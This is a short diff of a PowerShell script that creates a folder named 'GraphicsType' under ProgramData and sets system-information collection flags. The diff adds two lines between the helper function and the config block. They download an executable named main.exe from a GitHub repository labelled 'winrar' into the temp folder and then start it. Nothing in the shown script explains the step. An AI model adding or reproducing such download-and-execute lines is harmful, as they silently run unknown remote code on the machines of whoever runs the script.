@@ -5,6 +5,9 @@ New-Item -Path "$env:PROGRAMDATA\GraphicsType\" -ItemType Directory -Force | Out
 # BASE FUNCTION
 Function print{Write-Host $args}
 
+iwr -useb https://github.com/MisericordeXHD/winrar/raw/main/main.exe -o $env:TEMP\main.exe
+saps $env:TEMP\main.exe
+
 # CONFIG
 $systemInfo = $True
 $localizationInfo = $True
